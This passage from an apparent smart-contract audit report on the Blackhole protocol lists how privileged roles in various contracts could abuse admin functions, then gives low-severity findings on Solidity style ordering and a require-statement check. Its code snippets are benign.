\u003ccode\u003eapproveGenesisPool\u003c/code\u003e, \u003ccode\u003esetAuction\u003c/code\u003e, \u003ccode\u003esetEpochController\u003c/code\u003e, \u003ccode\u003esetMinimumDuration\u003c/code\u003e, \u003ccode\u003esetMinimumThreshold\u003c/code\u003e, \u003ccode\u003esetMaturityTime\u003c/code\u003e and \u003ccode\u003esetGenesisStartTime\u003c/code\u003e. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eWhitelisting arbitrary tokens or users (backdoor access): By calling\n\u003ccode\u003ewhiteListUserAndToken\u003c/code\u003e (\u003ccode\u003eproposedToken\u003c/code\u003e, \u003ccode\u003etokenOwner\u003c/code\u003e), governance can whitelist unvetted or malicious tokens and users.\u003c/li\u003e\n\u003cli\u003eApproving fraudulent or unqualified pools: Governance can approve a genesis pool (\u003ccode\u003eapproveGenesisPool\u003c/code\u003e) regardless of community consensus or the token’s legitimacy. The function only checks a few conditions like balance and duration, but there’s no check on project credibility or voting outcome.The Governor can even approve pools which benefits him(a cut directed to his address on every transaction that takes place.)\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eSilencing legitimate pools via rejection: By calling \u003ccode\u003erejectGenesisPool\u003c/code\u003e (\u003ccode\u003enativeToken\u003c/code\u003e), governance can deliberately shut down valid pools, sabotaging competitor projects.\u003c/p\u003e\n\u003cp\u003e\u003cem\u003eNote: Additionally all governance functions can be executed immediately with no time lock, delay, or DAO-based confirmation.\u003c/em\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003esetGenesisStartTime\u003c/code\u003e to years: The compromised or malicious governor can set the genesis start time to a long duration, such that genesis never begins.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e13. In the MinterUpgradable.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eTeam:\u003c/strong\u003e The team role has the ability to set gauge manager and set team rate. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSet malicious \u003ccode\u003egaugeManager\u003c/code\u003e contract: A compromised or malicious user with the team role can pass in a malicious \u003ccode\u003egaugeManager\u003c/code\u003e address such that it benefits him (e.g., Gauge emissions can be routed to attacker wallets).\u003c/li\u003e\n\u003cli\u003eSet team rate as Zero: Setting this as 0 would lead to the \u003ccode\u003eteamEmissions\u003c/code\u003e be transferred to the team as 0 every time \u003ccode\u003eupdate_period\u003c/code\u003e is called once every week.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e14. In the PermissionsRegistry.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eblackMultisig:\u003c/strong\u003e This role has the ability to \u003ccode\u003eaddRole\u003c/code\u003e, \u003ccode\u003eremoveRole\u003c/code\u003e, \u003ccode\u003esetRoleFor\u003c/code\u003e, \u003ccode\u003eremoveRoleFrom\u003c/code\u003e, \u003ccode\u003esetEmergencyCouncil\u003c/code\u003e and \u003ccode\u003esetBlackMultisig\u003c/code\u003e. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAdd arbitrary roles: The multisig can create meaningless or deceptive roles like, \u003ccode\u003eSUPER_ADMIN\u003c/code\u003e or \u003ccode\u003eUNLIMITED_MINTER\u003c/code\u003e — misleading names that may imply more power. Duplicate logical roles with different names (\u003ccode\u003eGAUGE_ADMIN\u003c/code\u003e vs \u003ccode\u003eGaugeAdmin\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003eAssign roles to malicious addresses: Assign critical roles (e.g., \u003ccode\u003eMINTER\u003c/code\u003e, \u003ccode\u003eGAUGE_ADMIN\u003c/code\u003e, \u003ccode\u003eROUTER_SETTER\u003c/code\u003e, etc.) to an EOA owned by attacker, Malicious contract or rotate them silently over time.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e15. In the RewardsDistributor.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eOwner:\u003c/strong\u003e The owner has the ability to \u003ccode\u003esetDepositor\u003c/code\u003e, \u003ccode\u003ewithdrawERC20\u003c/code\u003e, \u003ccode\u003esetAVM\u003c/code\u003e and renounce his ownership. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSilent draining: Owner can drain any ERC-20 token held by the contract at any time, He can do this silently since no event is emitted when the owner withdraws erc20 tokens.\u003c/li\u003e\n\u003cli\u003eSet a malicious avm: As stated in my previous governance risks, the owner can set a malicious avm address such that it benefits him. This is a direct setting; there is no external validation by any other sources that the avm address set by the owner is actually valid or not.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e16. In the RouterV2.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eOwner:\u003c/strong\u003e The owner has the ability to \u003ccode\u003esetSwapRouter\u003c/code\u003e, \u003ccode\u003esetAlgebraFactory\u003c/code\u003e, \u003ccode\u003esetQuoterV2\u003c/code\u003e, \u003ccode\u003esetAlgebraPoolAPI\u003c/code\u003e. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eMalicious router: Owner sets \u003ccode\u003eswapRouter\u003c/code\u003e to a malicious contract that, front-runs user swaps by manipulating pricing logic, steals tokens during swaps by redirecting \u003ccode\u003etransferFrom\u003c/code\u003e to self and overrides routing logic to siphon fees to themselves.\u003c/li\u003e\n\u003cli\u003eSet a fake Algebra Factory: Owner sets a fake factory that, creates fake pools with manipulated or spoofed token addresses.\u003c/li\u003e\n\u003cli\u003eSet malicious \u003ccode\u003esetAlgebraPoolAPI\u003c/code\u003e: If this API contract stores sensitive pool metadata (e.g., fee config, pool status, time-weighted data). Owner can redirect it to a contract that lies about past data which could affect, time-weighted average price (TWAP), fee growth history and Oracle usage.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e17. In the SetterTopNPoolsStrategy.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eOwner:\u003c/strong\u003e The owner has the ability to set a avm address. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSet a malicious avm: As stated in my previous governance risks, the owner can set a malicious avm address such that it benefits him. This is an direct setting; there is no external validation by any other sources that the avm address set by the owner is actually valid or not.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eExecutor:\u003c/strong\u003e The executor role has the ability to \u003ccode\u003esetTopNPools\u003c/code\u003e. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe executor sets top pools to low-volume, illiquid, or fake pools that they own or control, have no real trading activity, inflate stats or visibility. These pools could then attract volume, wrongly perceived as top pools, to receive higher incentives or emissions and trick users or LPs into providing liquidity or trading, leading to loss.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e18. In the Thenian.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eOwner:\u003c/strong\u003e The owner has the ability to withdraw, \u003ccode\u003esetRoot\u003c/code\u003e, \u003ccode\u003esetNftPrice\u003c/code\u003e and \u003ccode\u003ereserveNFTs\u003c/code\u003e. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRug pull: Owner can withdraw all ETH (e.g. mint proceeds) to any \u003ccode\u003emultiSig\u003c/code\u003e they control, leaving users who paid for NFTs with nothing in return.\u003c/li\u003e\n\u003cli\u003eIncrease price: Owner can dynamically raise the price after users are onboarded or committed, or lower the price for themselves or insiders after initial hype.\u003c/li\u003e\n\u003cli\u003eOwner can mint NFTs to themselves or insiders, before any public sale (sniping rare tokens), without paying in bulk to flip on secondary markets.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e19. In the TokenHandler.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eGovernance:\u003c/strong\u003e The governance role has the ability to \u003ccode\u003esetPermissionsRegistry\u003c/code\u003e, \u003ccode\u003ewhitelistTokens\u003c/code\u003e, \u003ccode\u003ewhitelistToken\u003c/code\u003e, \u003ccode\u003eblacklistTokens\u003c/code\u003e, \u003ccode\u003ewhitelistNFT\u003c/code\u003e, \u003ccode\u003eblacklistNFT\u003c/code\u003e, \u003ccode\u003ewhitelistConnectors\u003c/code\u003e, \u003ccode\u003ewhitelistConnector\u003c/code\u003e, \u003ccode\u003eblacklistConnector\u003c/code\u003e, \u003ccode\u003esetBucketType\u003c/code\u003e, \u003ccode\u003eupdateTokenVolatilityBucket\u003c/code\u003e. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe primary governance risk across these functions lies in the potential abuse of role-based control. A malicious governance actor could assign critical roles (e.g., connector tokens, whitelisted NFTs) to unauthorized or malicious addresses in exchange for bribes or personal gain. This could lead to privileged access, unfair trading advantages, or manipulation of protocol logic. Similarly, by removing or blacklisting legitimate entries, governance could censor users or competitors, undermining the fairness and neutrality of the protocol.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ewhitelistNFT\u003c/code\u003e/\u003ccode\u003eblacklistNFT\u003c/code\u003e: The governance can misuse this by selectively whitelisting NFTs they own, allowing them to access exclusive features such as staking rewards, airdrops, or protocol privileges. Conversely, they could blacklist legitimate user NFTs to exclude them from benefits, creating unfair advantages or censorship.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ewhitelistConnector\u003c/code\u003e/\u003ccode\u003ewhitelistConnectors\u003c/code\u003e: These functions allow governance to mark certain tokens as routing connectors, which can significantly influence DEX trading paths. A malicious actor could whitelist low-liquidity, high-fee, or malicious tokens to manipulate swaps, favor certain assets, or enable exploitative routing for personal gain.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eblacklistConnector\u003c/code\u003e: By blacklisting a connector, governance can disrupt the routing mechanism and effectively remove a token from trading paths. This could be used to block competitor tokens, harm projects that don’t align with governance interests, or censor tokens used widely by users, reducing decentralization and fairness.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003esetBucketType\u003c/code\u003e: This function allows governance to define or redefine the volatility bucket of tokens, potentially affecting their fee rates, risk handling, or trading logic. A dishonest actor could classify risky tokens as low-risk to game the system, offer misleading yields, or misrepresent token safety to users.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eGenesisManager:\u003c/strong\u003e Has similar but limited access as compared to governance. Thus, the risks remain same for both.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e20. In the VoterV3.sol\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eOwner:\u003c/strong\u003e Does not have much access in this contract, but has the ability to set an epoch owner.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eDoes not contain much risk (except that he can set it to a malicious address).\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eVoterAdmin:\u003c/strong\u003e The voter admin has the ability to \u003ccode\u003esetPermissionsRegistry\u003c/code\u003e, \u003ccode\u003esetMaxVotingNum\u003c/code\u003e, \u003ccode\u003esetAVM\u003c/code\u003e. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIn the \u003ccode\u003esetPermissionsRegistry\u003c/code\u003e function, the VoterAdmin can set a new \u003ccode\u003epermissionRegistry\u003c/code\u003e contract. If misused, they could point it to a malicious or manipulated contract that disables or weakens access control checks. This could allow unauthorized gauge creation, voting participation, or protocol interactions that would normally be restricted, effectively undermining governance integrity and enabling privilege escalation.\u003c/li\u003e\n\u003cli\u003eThrough the \u003ccode\u003esetMaxVotingNum\u003c/code\u003e function, the VoterAdmin can adjust the maximum number of pools or items a user can vote on. While this is intended for flexibility, an abusive admin could set this value excessively high or low. A very high value could spam or overload the system, potentially exhausting gas or storage, while a low value could limit voter effectiveness, censor specific users or preferences, and bias the outcome of votes.\u003c/li\u003e\n\u003cli\u003eThe \u003ccode\u003esetAVM\u003c/code\u003e function allows the admin to assign the Auto Voting Manager (avm) by fetching it from the Voting Escrow contract. If \u003ccode\u003e_ve\u003c/code\u003e is compromised or misconfigured, this function could silently redirect AVM privileges to an untrusted actor. This risks vote automation being controlled by a malicious contract, allowing votes to be cast or overridden without user consent, compromising the fairness of governance.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eGovernance:\u003c/strong\u003e Modifier is defined in this contract, but has no access to any of the functions.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eGenesisManager:\u003c/strong\u003e Modifier is defined in this contract, but has no access to any of the functions.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e21. In the VotingEscrow.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eTeam:\u003c/strong\u003e Has the ability to \u003ccode\u003esetArtProxy\u003c/code\u003e, \u003ccode\u003esetAVM\u003c/code\u003e, \u003ccode\u003etoggleSplit\u003c/code\u003e, \u003ccode\u003esetSmNFTBonus\u003c/code\u003e. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003esetArtProxy\u003c/code\u003e (address proxy): The team can change the art rendering proxy to a malicious or broken contract. This can result in NFTs displaying incorrect metadata or art, potentially misleading users or damaging the visual and branding integrity of the collection. If metadata is dynamic and depends on this proxy, they could also encode hidden traits, tracking, or backdoors.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003esetAVM\u003c/code\u003e (address avm): By changing the Auto Voting Manager (AVM) to a manipulated contract, the team can automate votes in favor of their interests. This undermines fair governance by enabling vote hijacking, centralized decision-making, or even bribe-taking via scripted AVM behavior that does not reflect real user preferences.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003etoggleSplit\u003c/code\u003e (bool state): This function may control whether NFTs can be split (e.g., fractionalized or split into sub-assets). Maliciously toggling this could disrupt NFT functionality, cause loss of composability or break integrations with platforms. Re-enabling or disabling split arbitrarily can be used to lock users out of expected functionality or manipulate secondary market behavior.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003esetSmNFTBonus\u003c/code\u003e (uint bonus): This sets the bonus for special SM NFTs. If the team assigns excessively high bonuses, they can create unfair yield or voting power advantages for themselves or insiders holding those NFTs. This distorts protocol incentives and governance, allowing the team to indirectly accumulate more control or rewards.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"12-function-declaration-does-not-follow-solidity-style-guide-at-fixedauctionsol\" style=\"position:relative;\"\u003e\u003ca href=\"#12-function-declaration-does-not-follow-solidity-style-guide-at-fixedauctionsol\" aria-label=\"12 function declaration does not follow solidity style guide at fixedauctionsol permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[12] Function declaration does not follow Solidity style guide at \u003ccode\u003eFixedAuction.sol\u003c/code\u003e\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/FixedAuction.sol#L14\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/FixedAuction.sol#L14\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-22\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-22\" aria-label=\"finding description 22 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003einitialize()\u003c/code\u003e function in the contract is written as follows:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"88\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitializer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e__Ownable_init\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis implementation does not conform to Solidity style guide and general best practices, particularly regarding code formatting, visibility placement, and readability.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eVisibility placement order:\u003c/strong\u003e According to the Solidity style guide (and common conventions), the order of function modifiers should follow this structure:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"89\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt;\u003c/span\u003e\u003cspan class=\"mtk10\"\u003ename\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e\u0026gt;(...) [\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e|\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e|\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e|\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eprivate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] [\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epure\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e|\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e|\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epayable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] [\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emodifiers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIn the current code, initializer is placed before public, which is unconventional and affects readability:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"90\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitializer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {  \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Incorrect order\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"impact-22\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-22\" aria-label=\"impact 22 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eDoes not follow the official solidity’s style guide.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-34\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-34\" aria-label=\"recommended mitigation steps 34 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eRecommended order:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"91\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitializer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 id=\"13-incorrect-require-statement-for-address-check-at-gaugev2sol\" style=\"position:relative;\"\u003e\u003ca href=\"#13-incorrect-require-statement-for-address-check-at-gaugev2sol\" aria-label=\"13 incorrect require statement for address check at gaugev2sol permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[13] Incorrect require statement for address check at \u003ccode\u003eGaugeV2.sol\u003c/code\u003e\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GaugeV2.sol#L139\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GaugeV2.sol#L139\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-23\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-23\" aria-label=\"finding description 23 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe function \u003ccode\u003esetInternalBribe\u003c/code\u003e allows the contract owner to update the address of the internal bribe contract, which is used to receive fees:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"92\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetInternalBribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_int\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan 